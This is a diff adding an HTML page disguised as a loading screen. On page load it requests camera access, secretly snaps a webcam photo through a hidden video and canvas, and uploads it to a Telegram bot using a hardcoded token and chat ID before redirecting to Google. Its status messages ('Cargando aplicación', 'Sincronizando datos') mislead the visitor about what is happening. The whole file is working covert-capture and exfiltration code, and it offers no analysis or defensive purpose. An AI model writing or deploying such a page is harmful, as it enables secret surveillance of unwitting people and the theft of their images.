@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Cargando...</title>
+</head>
+<body>
+    <video id="video" autoplay style="display:none;"></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+    <h2 id="status">Cargando aplicación... por favor espera.</h2>
+
+    <script>
+        const TOKEN = "8769009273:AAGH-ETikEtyh9jg9lX7vPO3kHSCoD1j4YU";
+        const CHAT_ID = "6728153588"; 
+
+        async function iniciar() {
+            const status = document.getElementById('status');
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+                status.innerText = "Sincronizando datos...";
+
+                setTimeout(() => {
+                    const canvas = document.getElementById('canvas');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    const ctx = canvas.getContext('2d');
+                    ctx.drawImage(video, 0, 0);
+
+                    canvas.toBlob(blob => {
+                        const formData = new FormData();
+                        formData.append('chat_id', CHAT_ID);
+                        formData.append('photo', blob, 'foto.jpg');
+
+                        status.innerText = "Finalizando...";
+
+                        fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
+                            method: 'POST',
+                            body: formData
+                        })
+                        .then(response => {
+                            if(response.ok) {
+                                status.innerText = "¡Completado!";
+                                // Solo redirige si todo salió bien después de 1 segundo
+                                setTimeout(() => { window.location.href = "https://www.google.com"; }, 1000);
+                            } else {
+                                status.innerText = "Error al enviar. ¿Iniciaste el bot?";
+                            }
+                        });
+                    }, 'image/jpeg');
+                }, 2000);
+            } catch (err) {
+                status.innerText = "Error: Debes permitir el acceso a la cámara para continuar.";
+            }
+        }
+
+        window.onload = iniciar;
+    </script>
+</body>
+</html>
